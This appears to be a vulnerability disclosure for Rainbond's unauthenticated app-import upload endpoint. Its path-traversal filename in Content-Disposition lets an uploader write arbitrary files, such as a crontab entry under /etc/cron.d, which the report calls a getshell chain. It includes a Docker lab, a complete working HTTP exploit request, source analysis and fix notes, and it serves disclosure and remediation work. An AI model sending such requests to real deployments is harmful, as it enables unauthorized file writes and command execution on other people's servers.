### Vulnerability details

**Official website / Product:** https://www.rainbond.com / https://github.com/goodrain/rainbond

**Repository:** goodrain/rainbond (stars at selection: 6290)

**Vulnerability type:** file_upload (arbitrary file write → cron getshell)

**Vulnerability versions:** v6.10.2-release (audited commit `7e2467b93399c2bc77fffb68af832634959eed3e` / current main); NewUpload import path

**Vulnerability URL / Parameter:** `POST /v2/app/upload/{eventID}` (route in `api/api_routers/version2/v2Routers.go` appRouter); header `Content-Disposition: attachment; filename="..."` (non-multipart FormFile); `Content-Type: application/octet-stream`; raw binary body

**Complex:** yes

### Verification procedure

1. Original `labs/rainbond-r17a9/poc-lab` and image `rainbond-r17a9-upload-lab:poc` were removed after verify. Rebuild with the files below (matches the Docker-verified topology): host port **19709** → container **6060**, container name `rainbond-r17a9-upload`, service `rainbond-upload-lab`, entrypoint `/upload-lab`. The lab binary is module `cmd/uploadlab`, importing the real `api/controller/upload` package (`NewStorage`/`UploadHandler`) and `pkg/component/storage` LocalStorage. It mirrors the production route `POST /v2/app/upload/{eventID}` (and websocket-style `/app/upload/{eventID}`). Full rainbond-api / K8s / MySQL / MQ is **not** required.

Write the following files in a working directory, then `docker compose up -d --build`.

`cmd/uploadlab/main.go` (alongside `Dockerfile` / `docker-compose.yml` in the build context; the image clones rainbond then COPY-overlays this file):

```go
package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/go-chi/chi"
	"github.com/goodrain/rainbond/api/controller/upload"
	"github.com/goodrain/rainbond/config/configs"
	"github.com/goodrain/rainbond/pkg/component/storage"
)

func newUpload(w http.ResponseWriter, r *http.Request) {
	eventID := strings.TrimSpace(chi.URLParam(r, "eventID"))
	if eventID == "" {
		http.Error(w, "Failed to parse eventID.", 500)
		return
	}
	// Same as production NewUpload: {GetStaticDir()}/import/{eventID}
	dirName := fmt.Sprintf("/grdata/app/import/%s", eventID)
	st := upload.NewStorage(dirName)
	st.UploadHandler(w, r)
}

func main() {
	configs.Default().StorageConfig.StorageType = "local"
	storage.New()
	if err := storage.Default().Start(context.Background()); err != nil {
		log.Fatal(err)
	}
	_ = os.MkdirAll("/grdata/app/import", 0o755)

	r := chi.NewRouter()
	r.Post("/v2/app/upload/{eventID}", newUpload)
	r.Post("/app/upload/{eventID}", newUpload)
	log.Println("listening :6060 rainbond LocalStorage + upload.NewStorage")
	log.Fatal(http.ListenAndServe(":6060", r))
}
```

`Dockerfile`:

```dockerfile
FROM golang:1.25-bookworm AS build
WORKDIR /src
RUN git clone --depth 1 https://github.com/goodrain/rainbond.git . \
 && git fetch --depth 1 origin 7e2467b93399c2bc77fffb68af832634959eed3e \
 && git checkout 7e2467b93399c2bc77fffb68af832634959eed3e
COPY cmd/uploadlab/main.go /src/cmd/uploadlab/main.go
ENV CGO_ENABLED=0 GOOS=linux
RUN go build -trimpath -ldflags="-s -w" -o /upload-lab ./cmd/uploadlab

FROM alpine:3.20
RUN apk add --no-cache ca-certificates
COPY --from=build /upload-lab /upload-lab
RUN mkdir -p /grdata/app/import
EXPOSE 6060
ENTRYPOINT ["/upload-lab"]
```

`docker-compose.yml`:

```yaml
services:
  rainbond-upload-lab:
    build: .
    image: rainbond-r17a9-upload-lab:poc
    container_name: rainbond-r17a9-upload
    ports:
      - "19709:6060"
```

2. After `docker compose up -d --build`, confirm listen. Expected `docker compose ps` / logs (Docker-verified):

```text
NAME                    IMAGE                           COMMAND         SERVICE               STATUS        PORTS
rainbond-r17a9-upload   rainbond-r17a9-upload-lab:poc   "/upload-lab"   rainbond-upload-lab   Up            0.0.0.0:19709->6060/tcp, [::]:19709->6060/tcp
```

```text
time="2026-11-01T18:06:02Z" level=info msg="initialize storage client type=local"
2026/11/01 18:06:02 listening :6060 rainbond LocalStorage + upload.NewStorage
```

3. **No credentials required:** `api/server/api.go` installs `FullToken` only when env `TOKEN` is non-empty; with `TOKEN` unset (this lab / default), `/v2/app/upload/{eventID}` is reachable without auth.
4. Send the complete HTTP request below (`application/octet-stream` + path-traversal filename in `Content-Disposition`; body is one crontab line).
5. Observe HTTP 200 with JSON echoing the traversal name in `list[].name` / `versions.original.filename`.
6. Confirm arbitrary write inside the container:

```bash
docker exec rainbond-r17a9-upload ls -la /etc/cron.d/r17a9
docker exec rainbond-r17a9-upload cat /etc/cron.d/r17a9
```

Expect:

```text
-rw-r--r--    1 root     root            48 Nov  1 18:06 /etc/cron.d/r17a9
```

```text
* * * * * root /bin/touch /tmp/r17a9-cron-fired
```

The same run also wrote `/tmp/r17a9-impact.txt` (66 bytes). On hosts running cron, writing under `/etc/cron.d/` is a getshell chain.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /v2/app/upload/evt-poc-1 HTTP/1.1
Host: 127.0.0.1:19709
User-Agent: r17a9-poc/1.0
Accept: */*
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="../../../../../../etc/cron.d/r17a9"
Content-Length: 48
Connection: close

* * * * * root /bin/touch /tmp/r17a9-cron-fired
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Sun, 01 Nov 2026 18:06:03 GMT
Content-Length: 214
Connection: close

{"list":[{"dir":"","name":"../../../../../../etc/cron.d/r17a9","type":"application","versions":{"original":{"filename":"../../../../../../etc/cron.d/r17a9","size":48,"url":"../../../../../../etc/cron.d/r17a9"}}}]}
```

In-container proof listing:

```text
-rw-r--r--    1 root     root            48 Nov  1 18:06 /etc/cron.d/r17a9
-rw-r--r--    1 root     root            66 Nov  1 18:06 /tmp/r17a9-impact.txt
```

Verification result notes:

- Container `rainbond-r17a9-upload` has `/etc/cron.d/r17a9` = `* * * * * root /bin/touch /tmp/r17a9-cron-fired`
- Proves `api/controller/upload` used by NewUpload does not Base-sanitize binary-upload filenames; `filepath.Join` resolves `../` outside the import directory
- Writing under cron.d yields command execution on hosts running cron (getshell chain)

### Vulnerability analysis

Region API app-import handler `AppStruct.NewUpload` (`api/controller/app.go`) sets the directory to `{GetStaticDir()}/import/{eventID}` (commonly `/grdata/app/import/{eventID}` in production) and calls `upload.NewStorage(dirName).UploadHandler`.

`UploadHandler` (`api/controller/upload/web.go`) → `process` → for non-multipart `application/octet-stream`, `parseContentDisposition` in `meta.go` stores the `filename` parameter **verbatim** (no `filepath.Base`). Then `attachment.createVersion` → `fileBaseManager.SetFilename` → `fileDefaultManager.rawCopy` → `fileBaseManager.Filepath()` does `filepath.Join(dir.Abs(), Filename)`. A filename such as `../../../../../../etc/cron.d/r17a9` writes attacker bytes to an arbitrary filesystem location.

By contrast, `Upload` / `UploadPackage` use `r.FormFile`, where Go's `multipart.Part.FileName()` applies `filepath.Base`, so that path is not exploitable the same way. The NewUpload binary branch bypasses that protection.

`api/server/api.go` installs `FullToken` only when env `TOKEN` is non-empty; with `TOKEN` unset, `/v2/app/upload/{eventID}` is reachable without auth. Even with TOKEN set, any caller allowed to import apps can escape the import root — this is not intentional admin webcli/pod-exec RCE.

Related (not separately counted here): unauthenticated websocket chunk upload builds `StoragePath` from JSON `file_name` without Base (`chunk_upload_manager.go`).

### Trigger / sink source (full path and line numbers):

```go
# File: api/controller/app.go
# Lines: 187-210
func (a *AppStruct) NewUpload(w http.ResponseWriter, r *http.Request) {
	eventID := strings.TrimSpace(chi.URLParam(r, "eventID"))
	switch r.Method {
	case "OPTIONS":
		// CORS ...
	case "POST":
		if eventID == "" {
			httputil.ReturnError(r, w, 500, "Failed to parse eventID.")
			return
		}
		dirName := fmt.Sprintf("%s/import/%s", handler.GetAppHandler().GetStaticDir(), eventID)
		st := upload.NewStorage(dirName)
		st.UploadHandler(w, r)
	}
}
```

```go
# File: api/controller/upload/web.go
# Lines: 21-47
func (s *Storage) UploadHandler(w http.ResponseWriter, r *http.Request) {
	files, err := process(r, s.StorageDir())
	// ...
	for _, file := range files {
		attachment, err := create(s.StorageDir(), file, true)
		// ...
		data = append(data, attachment.ToJson())
	}
	httputil.ReturnSuccess(r, w, data)
}
```

```go
# File: api/controller/upload/meta.go
# Lines: 57-75
func (m *meta) parseContentDisposition(cd string) error {
	if cd == "" {
		return nil
	}
	_, params, err := mime.ParseMediaType(cd)
	if err != nil {
		return err
	}
	filename, ok := params["filename"]
	if !ok {
		return errors.New("meta: filename in Content-Disposition not defined")
	}
	m.Filename = filename // no filepath.Base
	return nil
}
```

```go
# File: api/controller/upload/attachment.go
# Lines: 46-54
func (attachment *attachment) createVersion(version string) (fileManager, error) {
	fm := newFileManager(attachment.Dir, version)
	fm.SetFilename(attachment.originalFile)
	if err := fm.convert(attachment.originalFile.Filepath); err != nil {
		return nil, err
	}
	return fm, nil
}
```

```go
# File: api/controller/upload/file_manager.go
# Lines: 30-36
func (fbm *fileBaseManager) SetFilename(file *originalFile) {
	fbm.Filename = file.Filename
}
func (fbm *fileBaseManager) Filepath() string {
	return filepath.Join(fbm.Dir.Abs(), fbm.Filename)
}
```

### Fix notes

1. Always `filepath.Base` upload names; reject `..`, absolute paths, and path separators.
2. After `Clean`, require the resolved path to stay under the intended upload root (`strings.HasPrefix(resolved, root+sep)`).
3. Authenticate websocket file routes; apply the same checks to chunk-upload `file_name` / `eventID`.
